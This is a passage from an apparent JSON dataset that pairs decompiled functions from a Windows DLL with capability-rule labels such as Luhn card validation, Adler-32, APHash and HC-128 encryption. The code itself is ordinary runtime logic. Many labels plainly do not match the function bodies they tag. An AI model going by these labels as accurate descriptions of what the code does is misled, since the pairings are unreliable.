fcn.1800b4014(arg1_00, CONCAT71(uVar2 >> 8, 0x20), uVar7, arg4);\n    }\n    arg2 = &uStackX8;\n    fcn.1800b60f4(arg1_00, arg2, arg3, arg4);\n    if (((*(arg1 + 0x30) >> 3 & 1) != 0) && ((*(arg1 + 0x30) >> 2 & 1) == 0)) {\n        fcn.1800b4014(arg1_00, CONCAT71(arg2 >> 8, 0x30), uVar7, arg4);\n    }\n    uVar5 = 0;\n    uVar4 = fcn.1800b5f30(arg1);\n    if ((-1 < *arg4) && ((*(arg1 + 0x30) >> 2 & 1) != 0)) {\n        uVar4 = fcn.1800b4014(arg1_00, CONCAT71(uVar5 >> 8, 0x20), uVar7, arg4);\n    }\ncode_r0x0001800b4fce:\n    return uVar4 & 0xffffffffffffff00 | 1;\n}\n",
        "token_count": 1714
    },
    "1800bde7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nint64_t fcn.1800bde74(int16_t *arg1, int16_t *arg2, ulong arg3)\n\n{\n    uint *puVar1;\n    int64_t iVar2;\n    int64_t *arg1_00;\n    int64_t iStackX8;\n    \n    if (((arg1 == NULL) || (arg2 == NULL)) || (*arg2 == 0)) {\n        puVar1 = fcn.1800ba53c(arg1);\n        *puVar1 = 0x16;\n        fcn.1800b3508();\n    }\n    else if (*arg1 == 0) {\n        puVar1 = fcn.1800ba53c(arg1);\n        *puVar1 = 0x16;\n    }\n    else {\n        arg1_00 = &iStackX8;\n        fcn.1800c36ec(arg1_00);\n        if (iStackX8 != 0) {\n            iVar2 = fcn.1800cbeb0(arg1, arg2, arg3, iStackX8);\n            if (iVar2 == 0) {\n                fcn.1800c3744(iStackX8);\n            }\n            fcn.1800b22bc(iStackX8);\n            return iVar2;\n        }\n        puVar1 = fcn.1800ba53c(arg1_00);\n        *puVar1 = 0x18;\n    }\n    return 0;\n}\n",
        "token_count": 319
    },
    "1800cde1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nint64_t * fcn.1800cde18(int64_t *arg1, ulong arg2)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int64_t *piVar5;\n    int64_t *piVar6;\n    int64_t iVar7;\n    int64_t *piVar8;\n    int64_t *piVar9;\n    uint64_t uVar10;\n    uint32_t uVar11;\n    int64_t *piVar12;\n    int64_t iVar13;\n    \n    piVar9 = NULL;\n    uVar11 = 0;\n    if (arg1 == NULL) {\n        puVar4 = fcn.1800ba53c(0);\n        *puVar4 = 0x16;\n        return 0xffffffffffffffff;\n    }\n    piVar8 = arg1;\n    piVar5 = fcn.1800add0c(arg1, 0x3d);\n    piVar12 = arg1;\n    if ((piVar5 == NULL) || (piVar5 == arg1)) {\ncode_r0x0001800cdce2:\n        puVar4 = fcn.1800ba53c(piVar8);\n        uVar11 = 0xffffffff;\n        *puVar4 = 0x16;\n    }\n    else {\n        cVar1 = *(piVar5 + 1);\n        if (*0x1801297f8 == *0x180129810) {\n            piVar6 = fcn.1800cdd30(*0x1801297f8);\n            piVar8 = *0x1801297f8;\n            *0x1801297f8 = piVar6;\n        }\n        if (*0x1801297f8 == NULL) {\n            if ((arg2 != 0) && (*0x180129800 != 0)) {\n                iVar7 = fcn.1800c1370();\n                if (iVar7 != 0) {\n                    if (*0x1801297f8 == *0x180129810) {\n                        *0x1801297f8 = fcn.1800cdd30(*0x1801297f8);\n                    }\n                    goto code_r0x0001800cdb54;\n                }\n                goto code_r0x0001800cdce2;\n            }\n            if (cVar1 != '\\0') {\n                *0x1801297f8 = fcn.1800c6094(1, 8);\n                fcn.1800c34d4(0);\n                if (*0x1801297f8 != NULL) {\n                    if (*0x180129800 == 0) {\n                        *0x180129800 = fcn.1800c6094(1, 8);\n                        fcn.1800c34d4(0);\n                        if (*0x180129800 == 0) goto code_r0x0001800cdb17;\n                    }\ncode_r0x0001800cdb54:\n                    if (*0x1801297f8 != NULL) goto code_r0x0001800cdb59;\n                }\ncode_r0x0001800cdb17:\n                uVar11 = 0xffffffff;\n            }\n        }\n        else {\ncode_r0x0001800cdb59:\n            piVar8 = *0x1801297f8;\n            iVar13 = piVar5 - arg1;\n            iVar7 = **0x1801297f8;\n            piVar6 = *0x1801297f8;\n            while (iVar7 != 0) {\n                iVar3 = fcn.1800d4884(arg1, iVar7, iVar13);\n                if ((iVar3 == 0) && ((*(iVar13 + *piVar6) == '=' || (*(iVar13 + *piVar6) == '\\0')))) {\n                    iVar7 = piVar6 - piVar8 >> 3;\n                    goto code_r0x0001800cdba8;\n                }\n                piVar6 = piVar6 + 1;\n                iVar7 = *piVar6;\n            }\n            iVar7 = -(piVar6 - piVar8 >> 3);\ncode_r0x0001800cdba8:\n            if ((-1 < iVar7) && (*piVar8 != 0)) {\n                fcn.1800c34d4(piVar8[iVar7]);\n                if (cVar1 == '\\0') {\n                    for (; piVar8[iVar7] != 0; iVar7 = iVar7 + 1) {\n                        piVar8[iVar7] = piVar8[iVar7 + 1];\n                    }\n                    piVar8 = fcn.1800cde20(piVar8, iVar7, 8);\n                    fcn.1800c34d4(0);\n                    if (piVar8 != NULL) {\n                        *0x1801297f8 = piVar8;\n                    }\n                }\n                else {\n                    piVar8[iVar7] = arg1;\n                    piVar12 = piVar9;\n                }\ncode_r0x0001800cdc61:\n                if (arg2 != 0) {\n                    iVar7 = -1;\n                    do {\n                        iVar13 = iVar7;\n                        iVar7 = iVar13 + 1;\n                    } while (*(arg1 + iVar13 + 1) != '\\0');\n                    iVar7 = fcn.1800c6094(iVar13 + 3, 1);\n                    if (iVar7 != 0) {\n                        iVar3 = fcn.1800c1fe8(iVar7, iVar13 + 3, arg1);\n                        if (iVar3 != 0) {\n                            fcn.1800b3558(0, 0, 0, 0, 0);\n                            pcVar2 = swi(3);\n                            piVar9 = (*pcVar2)();\n                            return piVar9;\n                        }\n                        uVar10 = piVar5 + (iVar7 - arg1) + 1;\n                        *(uVar10 - 1) = 0;\n                        iVar13 = iVar7;\n                        iVar3 = fcn.1800d499c(iVar7, -(cVar1 != '\\0') & uVar10);\n                        if (iVar3 == 0) {\n                            puVar4 = fcn.1800ba53c(iVar13);\n                            piVar9 = 0xffffffff;\n                            *puVar4 = 0x2a;\n                        }\n                    }\n                    fcn.1800c34d4(iVar7);\n                }\n                goto code_r0x0001800cdcf9;\n            }\n            if (cVar1 != '\\0') {\n                uVar10 = -iVar7 + 2;\n                if ((-iVar7 <= uVar10) && (uVar10 < 0x1fffffffffffffff)) {\n                    piVar8 = fcn.1800cde20(piVar8, uVar10, 8);\n                    fcn.1800c34d4(0);\n                    if (piVar8 != NULL) {\n                        piVar8[-iVar7] = arg1;\n                        piVar8[1 - iVar7] = 0;\n                        piVar12 = piVar9;\n                        *0x1801297f8 = piVar8;\n                        goto code_r0x0001800cdc61;\n                    }\n                }\n                uVar11 = 0xffffffff;\n            }\n        }\n    }\n    piVar9 = uVar11;\ncode_r0x0001800cdcf9:\n    fcn.1800c34d4(piVar12);\n    return piVar9;\n}\n",
        "token_count": 1654
    },
    "1800d18c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nulong fcn.1800d18cc(uint64_t *arg1, uchar *arg2, uint64_t arg3, ulong arg4)\n\n{\n    code *pcVar1;\n    bool bVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int64_t arg3_00;\n    int64_t iVar5;\n    uint64_t uVar7;\n    ulong uVar8;\n    ulong uVar9;\n    int64_t iVar6;\n    \n    uVar8 = 0xb;\n    fcn.1800bad60(0xb);\n    uVar9 = 0;\n    if (arg1 != NULL) {\n        *arg1 = 0;\n        if (arg2 == NULL) {\ncode_r0x0001800d1830:\n            if (arg3 == 0) goto code_r0x0001800d1835;\ncode_r0x0001800d183c:\n            bVar2 = false;\n        }\n        else {\n            if (arg3 == 0) {\n                if (arg2 == NULL) goto code_r0x0001800d1830;\n                goto code_r0x0001800d183c;\n            }\ncode_r0x0001800d1835:\n            bVar2 = true;\n        }\n        if (bVar2) {\n            if (arg2 != NULL) {\n                *arg2 = 0;\n            }\n            arg3_00 = fcn.1800d1748(arg4);\n            if (arg3_00 != 0) {\n                iVar5 = -1;\n                do {\n                    iVar6 = iVar5;\n                    iVar5 = iVar6 + 1;\n                } while (*(arg3_00 + iVar5) != '\\0');\n                uVar7 = iVar6 + 2;\n                *arg1 = uVar7;\n                if (arg3 != 0) {\n                    if (arg3 < uVar7) {\n                        uVar9 = 0x22;\n                    }\n                    else {\n                        iVar3 = fcn.1800c1fe8(arg2, arg3, arg3_00);\n                        if (iVar3 != 0) {\n                            fcn.1800b3558(0, 0, 0, 0, 0);\n                            pcVar1 = swi(3);\n                            uVar8 = (*pcVar1)();\n                            return uVar8;\n                        }\n                    }\n                }\n            }\n            goto code_r0x0001800d188c;\n        }\n    }\n    puVar4 = fcn.1800ba53c(uVar8);\n    uVar9 = 0x16;\n    *puVar4 = 0x16;\n    fcn.1800b3508();\ncode_r0x0001800d188c:\n    fcn.1800badb4(0xb);\n    return uVar9;\n}\n",
        "token_count": 622
    },
    "1800d643": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.1800d643c(int64_t arg1, ulong arg2, int64_t *arg3, ulong arg4)\n\n{\n    int64_t iVar1;\n    ulong uVar2;\n    int64_t arg2_00;\n    uint8_t *in_stack_00000028;\n    \n    if ((*in_stack_00000028 & 1) == 0) {\n        arg2_00 = 0;\n        iVar1 = arg2_00;\n        if (*(in_stack_00000028 + 0x18) != 0) {\n            iVar1 = *(in_stack_00000028 + 0x18) + *(arg1 + 0x38);\n        }\n        if (iVar1 != 0) {\n            if ((*in_stack_00000028 & 4) != 0) {\n                uVar2 = fcn.1800adc68(arg3, in_stack_00000028 + 8);\n                if (*(in_stack_00000028 + 0x18) != 0) {\n                    arg2_00 = *(in_stack_00000028 + 0x18) + *(arg1 + 0x38);\n                }\n                fcn.1800b0700(arg2, arg2_00, uVar2, 1);\n                return;\n            }\n            uVar2 = fcn.1800adc68(arg3, in_stack_00000028 + 8);\n            if (*(in_stack_00000028 + 0x18) != 0) {\n                arg2_00 = *(in_stack_00000028 + 0x18) + *(arg1 + 0x38);\n            }\n            fcn.1800b06f4(arg2, arg2_00, uVar2);\n            return;\n        }\n    }\n    fcn.1800ade80(arg2, arg3, arg4);\n    if (((*in_stack_00000028 & 8) != 0) && (*arg3 != 0)) {\n        (**0x1800de8f0)();\n    }\n    return;\n}\n",
        "token_count": 451
    },
    "18004b1d": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nuint64_t fcn.18004b1d0(void)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    ulong arg1;\n    uint64_t uVar3;\n    uchar *arg1_00;\n    int64_t arg1_01;\n    uchar auStack112 [16];\n    ulong uStack96;\n    ulong uStack88;\n    uchar auStack80 [16];\n    ulong uStack64;\n    ulong uStack56;\n    int64_t aiStack48 [3];\n    uint64_t uStack24;\n    \n    uStack96 = 0;\n    uStack88 = 0xf;\n    auStack112[0] = 0;\n    fcn.180011120(auStack112, 0x1800f797c, 1);\n    uStack64 = 0;\n    uStack56 = 0xf;\n    auStack80[0] = 0;\n    arg1_00 = auStack80;\n    fcn.180011120(arg1_00, 0x1800f9668, 0xd);\n    arg1 = fcn.180007730(arg1_00, aiStack48, auStack80, auStack112);\n    uVar2 = fcn.180067a70(arg1, 0x10);\n    if (7 < uStack24) {\n        arg1_01 = aiStack48[0];\n        if (0xfff < uStack24 * 2 + 2) {\n            arg1_01 = *(aiStack48[0] + -8);\n            if (0x1f < (aiStack48[0] - arg1_01) - 8U) {\n                fcn.1800b3528(arg1_01, uStack24 * 2 + 0x29);\n                pcVar1 = swi(3);\n                uVar3 = (*pcVar1)();\n                return uVar3;\n            }\n        }\n        fcn.18008fb24(arg1_01);\n    }\n    return uVar2 & 0xff00 | (uVar2 >> 0x10 & 0xffU) << 0x10 | uVar2 & 0xff;\n}\n",
        "token_count": 477
    },
    "18004b66": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nvoid fcn.18004b660(int64_t arg1, ulong noname_1, ulong arg3)\n\n{\n    ulong uVar1;\n    uint8_t in_R9B;\n    uchar auStack88 [32];\n    uchar auStack56 [24];\n    uint64_t uStack32;\n    \n    uStack32 = *0x180123080 ^ auStack88;\n    if (noname_1 != '\\0') {\n        fcn.180020a90(auStack56, 7, L\"%06X\", arg3);\n        (**0x1800de788)(*(arg1 + 8));\n    }\n    *(arg1 + 1) = 1;\n    *(arg1 + 0x18 + (in_R9B ^ 1) * 4) = arg3 & 0xff00 | (arg3 >> 0x10 & 0xffU) << 0x10 | arg3 & 0xff;\n    uVar1 = 0x2717;\n    if (in_R9B != 0) {\n        uVar1 = 0x2714;\n    }\n    fcn.180068540(*(arg1 + 8), uVar1);\n    fcn.18004b730(arg1);\n    fcn.18008fb00(uStack32 ^ auStack88);\n    return;\n}\n",
        "token_count": 292
    },
    "18004bbb": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nvoid fcn.18004bbb0(uchar *arg1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint8_t in_DL;\n    ulong uVar3;\n    uchar auStack152 [32];\n    ulong uStack120;\n    ulong uStack112;\n    ulong uStack104;\n    uint32_t uStack96;\n    uint uStack92;\n    uchar *puStack88;\n    uint uStack80;\n    ulong uStack76;\n    ulong uStack68;\n    ulong uStack60;\n    uint uStack52;\n    uchar auStack40 [24];\n    uint64_t uStack16;\n    \n    uStack16 = *0x180123080 ^ auStack152;\n    uVar1 = fcn.18004b560(arg1);\n    uStack112 = *(arg1 + 8);\n    uStack104 = 0;\n    uStack92 = 0;\n    uStack76 = 0;\n    uStack68 = 0;\n    uStack60 = 0;\n    uStack52 = 0;\n    uStack120 = 0x48;\n    uStack80 = 3;\n    uStack96 = uVar1 & 0xff00 | (uVar1 >> 0x10 & 0xffU) << 0x10 | uVar1 & 0xff;\n    puStack88 = arg1 + 0x20;\n    iVar2 = (**0x1800de028)(&uStack120);\n    uVar1 = uStack96;\n    if (iVar2 != 0) {\n        fcn.180020a90(auStack40, 7, L\"%06X\", uStack96);\n        uVar3 = 0x2716;\n        if (in_DL != 0) {\n            uVar3 = 0x2713;\n        }\n        (**0x1800de788)(*(arg1 + 8), uVar3, auStack40);\n        arg1[1] = 1;\n        *(arg1 + (in_DL ^ 1) * 4 + 0x18) = uVar1 & 0xff00 | (uVar1 >> 0x10 & 0xffU) << 0x10 | uVar1 & 0xff;\n        uVar3 = 0x2717;\n        if (in_DL != 0) {\n            uVar3 = 0x2714;\n        }\n        fcn.180068540(*(arg1 + 8), uVar3);\n        fcn.18004b730(arg1);\n        *arg1 = 0;\n    }\n    fcn.18008fb00(uStack16 ^ auStack152);\n    return;\n}\n",
        "token_count": 585
    },
    "180001dd": {
        "rules": [
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0"
        ],
        "decompiled_code": "\nvoid fcn.180001dd0(uchar *arg1, ulong arg2)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    char *arg2_00;\n    uchar auStack88 [32];\n    uchar *puStack56;\n    char acStack29 [5];\n    uint64_t uStack24;\n    char *pcVar3;\n    \n    uStack24 = *0x180123080 ^ auStack88;\n    arg2_00 = acStack29 + 2;\n    uVar2 = arg2;\n    if (arg2 < 0) {\n        arg2._0_4_ = -arg2;\n        do {\n            pcVar3 = arg2_00;\n            arg2_00 = pcVar3 + -1;\n            *arg2_00 = arg2 + (arg2 / 10) * -10 + '0';\n            arg2._0_4_ = arg2 / 10;\n        } while (arg2 != 0);\n        arg2_00 = pcVar3 + -2;\n        *arg2_00 = '-';\n    }\n    else {\n        do {\n            arg2_00 = arg2_00 + -1;\n            uVar1 = uVar2 / 10;\n            *arg2_00 = uVar2 + uVar1 * -10 + '0';\n            uVar2 = uVar1;\n        } while (uVar1 != 0);\n    }\n    *(arg1 + 0x10) = 0;\n    *(arg1 + 0x18) = 0xf;\n    *arg1 = 0;\n    puStack56 = arg1;\n    if (arg2_00 != acStack29 + 2) {\n        fcn.180011120(arg1, arg2_00, acStack29 + (2 - arg2_00));\n    }\n    fcn.18008fb00(uStack24 ^ auStack88);\n    return;\n}\n",
        "token_count": 426
    },
    "180016e3": {
        "rules": [
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0"
        ],
        "decompiled_code": "\nuint16_t * fcn.180016e30(int64_t arg1, uint16_t *arg2, uint16_t *arg3, int64_t arg4)\n\n{\n    uint16_t *puVar1;\n    uint16_t uVar2;\n    uint32_t *puVar3;\n    int64_t iVar4;\n    char cVar5;\n    uint8_t uVar6;\n    uint16_t uVar7;\n    uint16_t *puVar8;\n    uint16_t *puVar9;\n    uint32_t uVar10;\n    uint64_t uVar11;\n    uint64_t uVar12;\n    uint32_t uVar13;\n    \n    if (arg4 == 0) {\n        arg4 = *(arg1 + 0xb0);\n    }\n    if (arg2 == arg3) {\n        return arg2;\n    }\n    do {\n        if (arg4 == 0) {\n            return arg2;\n        }\n    // switch table (21 cases) at 0x18001716c\n        switch(*(arg4 + 8)) {\n        case 1:\n        case 8:\n        case 9:\n        case 0xd:\n        case 0xe:\n        case 0x14:\n            arg4 = *(arg4 + 0x10);\n            break;\n        case 2:\n            if (arg2[-1] == 10) {\n                return arg2;\n            }\n            goto code_r0x000180016e92;\n        case 3:\n            goto code_r0x000180016ec0;\n        default:\n            return arg2;\n        case 6:\n            goto code_r0x000180016ef0;\n        case 7:\n            goto code_r0x000180016f60;\n        case 0xc:\n        case 0x15:\n            arg4 = 0;\n            break;\n        case 0x10:\n            goto code_r0x000180017136;\n        }\n    } while( true );\ncode_r0x000180016f60:\n    puVar1 = arg2 + 1;\n    uVar2 = *arg2;\n    for (puVar3 = *(arg4 + 0x20); puVar3 != NULL; puVar3 = *(puVar3 + 6)) {\n        uVar12 = 0;\n        if (puVar3[3] != 0) {\n            uVar10 = *puVar3;\n            do {\n                uVar11 = 0;\n                puVar8 = arg2;\n                if (uVar10 != 0) {\n                    puVar9 = *(puVar3 + 4) + uVar12 * 2;\n                    do {\n                        uVar7 = *puVar8;\n                        puVar8 = puVar8 + 1;\n                        if (uVar7 != *puVar9) break;\n                        uVar11 = uVar11 + 1;\n                        puVar9 = puVar9 + 1;\n                    } while (uVar11 < uVar10);\n                }\n                if (puVar8 == puVar1) {\n                    if (puVar1 == arg2) goto code_r0x000180016fc5;\n                    uVar10 = 1;\n                    goto code_r0x0001800170f9;\n                }\n                uVar13 = uVar12 + uVar10;\n                uVar12 = uVar13;\n            } while (uVar13 < puVar3[3]);\n        }\n    }\ncode_r0x000180016fc5:\n    iVar4 = *(arg4 + 0x38);\n    if (iVar4 != 0) {\n        uVar7 = uVar2;\n        if ((*(arg1 + 0xb8) & 0x800) != 0) {\n            uVar7 = fcn.180017ba0(*(arg1 + 0xd0));\n        }\n        uVar12 = 0;\n        if (*(iVar4 + 4) != 0) {\n            do {\n                puVar8 = *(iVar4 + 8) + uVar12 * 2;\n                if ((*puVar8 < uVar7 || *puVar8 == uVar7) &&\n                   (puVar8 = *(iVar4 + 8) + (uVar12 + 1) * 2,  uVar7 < *puVar8 || uVar7 == *puVar8))\n                goto code_r0x0001800170f0;\n                uVar10 = uVar12 + 2;\n                uVar12 = uVar10;\n            } while (uVar10 < *(iVar4 + 4));\n        }\n    }\n    if (uVar2 < 0x100) {\n        if (*(arg4 + 0x28) != 0) {\n            uVar6 = *((uVar2 >> 3) + *(arg4 + 0x28)) & 1 << (uVar2 & 7);\ncode_r0x0001800170ee:\n            if (uVar6 != 0) {\ncode_r0x0001800170f0:\n                uVar10 = 1;\n                goto code_r0x0001800170f9;\n            }\n        }\ncode_r0x0001800170f7:\n        uVar10 = 0;\n    }\n    else {\n        iVar4 = *(arg4 + 0x30);\n        if (iVar4 == 0) {\ncode_r0x00018001709f:\n            if ((*(arg4 + 0x40) == 0) || (cVar5 = (**(**(*(arg1 + 0xd0) + 8) + 0x20))(),  cVar5 == '\\0')) {\n                if (*(arg4 + 0x48) != 0) {\n                    uVar6 = fcn.180019870(uVar2, *(arg4 + 0x48), *(arg1 + 0xd0));\n                    goto code_r0x0001800170ee;\n                }\n                goto code_r0x0001800170f7;\n            }\n            uVar10 = 1;\n        }\n        else {\n            puVar8 = *(iVar4 + 8);\n            for (puVar9 = puVar8; (puVar9 != puVar8 + *(iVar4 + 4) && (*puVar9 != uVar2)); puVar9 = puVar9 + 1) {\n            }\n            if (puVar9 == puVar8 + *(iVar4 + 4)) goto code_r0x00018001709f;\n            uVar10 = 1;\n        }\n    }\ncode_r0x0001800170f9:\n    if ((uVar10 != (*(arg4 + 0xc) & 1)) || (arg2 = puVar1,  puVar1 == arg3)) {\n        return arg2;\n    }\n    goto code_r0x000180016f60;\ncode_r0x000180017136:\n    do {\n        if (arg4 == 0) {\n            return arg3;\n        }\n        arg3 = fcn.180016e30(arg1, arg2, arg3, *(arg4 + 0x10));\n        arg4 = *(arg4 + 0x28);\n    } while (arg2 != arg3);\n    return arg3;\ncode_r0x000180016ef0:\n    do {\n        puVar1 = arg2 + 1;\n        puVar8 = fcn.1800196b0(arg2, puVar1, *(arg4 + 0x28), *(arg4 + 0x28) + 2);\n        if (puVar8 != arg2) {\n            return arg2;\n        }\n        arg2 = puVar1;\n    } while (puVar1 != arg3);\n    return puVar1;\ncode_r0x000180016ec0:\n    do {\n        if (*arg2 == 10) {\n            return arg2;\n        }\n        arg2 = arg2 + 1;\n    } while (arg2 != arg3);\n    return arg2;\n    while (arg2 = arg2 + 1,  arg2 != arg3) {\ncode_r0x000180016e92:\n        if (*arg2 == 10) break;\n    }\n    if (arg2 != arg3) {\n        arg2 = arg2 + 1;\n    }\n    return arg2;\n}\n",
        "token_count": 1816
    },
    "18001a5d": {
        "rules": [
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0"
        ],
        "decompiled_code": "\nvoid fcn.18001a5d0(int64_t arg1)\n\n{\n    uint32_t *puVar1;\n    code *pcVar2;\n    uchar auVar3 [16];\n    uint16_t uVar4;\n    uchar (*pauVar5) [16];\n    ulong *puVar6;\n    ulong uVar7;\n    int64_t iVar8;\n    int64_t iVar9;\n    uint64_t in_RDX;\n    uint64_t uVar10;\n    uint32_t uVar11;\n    uint64_t uVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    uint16_t in_R8W;\n    \n    uVar14 = in_R8W;\n    if ((*(arg1 + 0x10) & 0x100) == 0) {\n        uVar12 = in_RDX & 0xffff;\n    }\n    else {\n        uVar4 = (**(**(*(arg1 + 0x18) + 8) + 0x40))();\n        uVar12 = uVar4;\n        uVar4 = (**(**(*(arg1 + 0x18) + 8) + 0x40))();\n        uVar14 = uVar4;\n    }\n    iVar9 = *(arg1 + 8);\n    if (uVar12 <= uVar14) {\n        while (uVar11 = uVar12,  uVar14 < *(arg1 + 0x20)) {\n            pauVar5 = *(iVar9 + 0x28);\n            if (pauVar5 == NULL) {\n                pauVar5 = fcn.18008fb2c(0x20);\n                *pauVar5 = ZEXT816(0);\n                pauVar5[1] = ZEXT816(0);\n                *(iVar9 + 0x28) = pauVar5;\n            }\n            uVar10 = uVar12 >> 3;\n            uVar12 = uVar11 + 1;\n            (*pauVar5)[uVar10] = (*pauVar5)[uVar10] | 1 << (uVar11 & 7);\n            if (uVar14 < uVar11 + 1) {\n                return;\n            }\n        }\n        if (uVar14 < uVar11) {\n            return;\n        }\n        if (uVar14 - uVar11 < *(arg1 + 0x24)) {\n            do {\n                fcn.18001a870(arg1);\n                uVar11 = uVar12 + 1;\n                uVar12 = uVar11;\n            } while (uVar11 <= uVar14);\n            return;\n        }\n        puVar6 = *(iVar9 + 0x38);\n        if (puVar6 == NULL) {\n            puVar6 = fcn.18008fb2c(0x10);\n            *puVar6 = 0;\n            puVar6[1] = 0;\n            *(iVar9 + 0x38) = puVar6;\n        }\n        uVar11 = *(puVar6 + 4);\n        if (*puVar6 < uVar11 || *puVar6 == uVar11) {\n            uVar13 = uVar11 + 0x10;\n            auVar3 = ZEXT816(2) * ZEXT416(uVar13);\n            uVar7 = SUB168(auVar3, 0);\n            if (SUB168(auVar3 >> 0x40, 0) != 0) {\n                uVar7 = 0xffffffffffffffff;\n            }\n            iVar8 = fcn.1800b15d0(puVar6[1], uVar7);\n            if (iVar8 == 0) goto code_r0x00018001a77f;\n            puVar6[1] = iVar8;\n            uVar11 = *(puVar6 + 4);\n            *puVar6 = uVar13;\n        }\n        *(puVar6[1] + uVar11 * 2) = uVar12;\n        *(puVar6 + 4) = *(puVar6 + 4) + 1;\n        puVar1 = *(iVar9 + 0x38);\n        uVar11 = puVar1[1];\n        if (*puVar1 < uVar11 || *puVar1 == uVar11) {\n            uVar13 = uVar11 + 0x10;\n            auVar3 = ZEXT816(2) * ZEXT416(uVar13);\n            uVar7 = SUB168(auVar3, 0);\n            if (SUB168(auVar3 >> 0x40, 0) != 0) {\n                uVar7 = 0xffffffffffffffff;\n            }\n            iVar9 = fcn.1800b15d0(*(puVar1 + 2), uVar7);\n            if (iVar9 == 0) {\ncode_r0x00018001a77f:\n                fcn.18006df20();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            uVar11 = puVar1[1];\n            *(puVar1 + 2) = iVar9;\n            *puVar1 = uVar13;\n        }\n        *(*(puVar1 + 2) + uVar11 * 2) = uVar14;\n        puVar1[1] = puVar1[1] + 1;\n    }\n    return;\n}\n",
        "token_count": 1185
    },
    "18001a79": {
        "rules": [
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0"
        ],
        "decompiled_code": "\nvoid fcn.18001a790(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int64_t *piVar2;\n    char cVar3;\n    uchar (*pauVar4) [16];\n    uint16_t in_DX;\n    uint32_t uVar5;\n    uint64_t uVar6;\n    char in_R8B;\n    \n    iVar1 = *(arg1 + 8);\n    uVar5 = 0;\n    uVar6 = 0;\n    do {\n        if (in_DX == 0xffff) {\n            if (uVar5 != 0x5f) {\n                piVar2 = *(*(arg1 + 0x18) + 8);\n                cVar3 = (**(*piVar2 + 0x20))(piVar2, 0x107, uVar5 & 0xffff);\n                if (cVar3 == '\\0') goto code_r0x00018001a7fc;\n            }\n            cVar3 = '\\x01';\n        }\n        else {\n            piVar2 = *(*(arg1 + 0x18) + 8);\n            cVar3 = (**(*piVar2 + 0x20))(piVar2, in_DX);\n        }\ncode_r0x00018001a7fc:\n        if (cVar3 != in_R8B) {\n            pauVar4 = *(iVar1 + 0x28);\n            if (pauVar4 == NULL) {\n                pauVar4 = fcn.18008fb2c(0x20);\n                *pauVar4 = ZEXT816(0);\n                pauVar4[1] = ZEXT816(0);\n                *(iVar1 + 0x28) = pauVar4;\n            }\n            (*pauVar4)[uVar6 >> 3] = (*pauVar4)[uVar6 >> 3] | 1 << (uVar5 & 7);\n        }\n        uVar5 = uVar5 + 1;\n        uVar6 = uVar6 + 1;\n        if (0xff < uVar5) {\n            *(iVar1 + 0x40) = *(iVar1 + 0x40) | in_DX;\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 493
    },
    "18001ae7": {
        "rules": [
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0"
        ],
        "decompiled_code": "\nulong fcn.18001ae70(uint16_t **arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    char cVar2;\n    uint16_t uVar3;\n    uint16_t uVar4;\n    uint16_t *puVar5;\n    int16_t iVar6;\n    uint32_t uVar7;\n    uint64_t uVar8;\n    uint16_t *puVar9;\n    uint16_t *puVar10;\n    \n    puVar10 = *arg1;\n    uVar3 = *puVar10;\n    if ((*(arg1 + 0x17) & 0x100) != 0) {\n        uVar3 = (**(**(arg1[0x1a] + 4) + 0x40))();\n        puVar10 = *arg1;\n    }\n    puVar9 = puVar10 + 1;\n    if ((*(arg2 + 0x20) == 0) || (puVar5 = fcn.1800197e0(puVar10, arg1[0x14], *(arg2 + 0x20)),  puVar5 == puVar10)) {\n        iVar1 = *(arg2 + 0x38);\n        if (iVar1 != 0) {\n            uVar4 = uVar3;\n            if ((*(arg1 + 0x17) & 0x800) != 0) {\n                uVar4 = fcn.180017ba0(arg1[0x1a]);\n            }\n            uVar8 = 0;\n            if (*(iVar1 + 4) != 0) {\n                do {\n                    puVar10 = *(iVar1 + 8) + uVar8 * 2;\n                    if ((*puVar10 < uVar4 || *puVar10 == uVar4) &&\n                       (puVar10 = *(iVar1 + 8) + (uVar8 + 1) * 2,  uVar4 < *puVar10 || uVar4 == *puVar10))\n                    goto code_r0x00018001b04b;\n                    uVar7 = uVar8 + 2;\n                    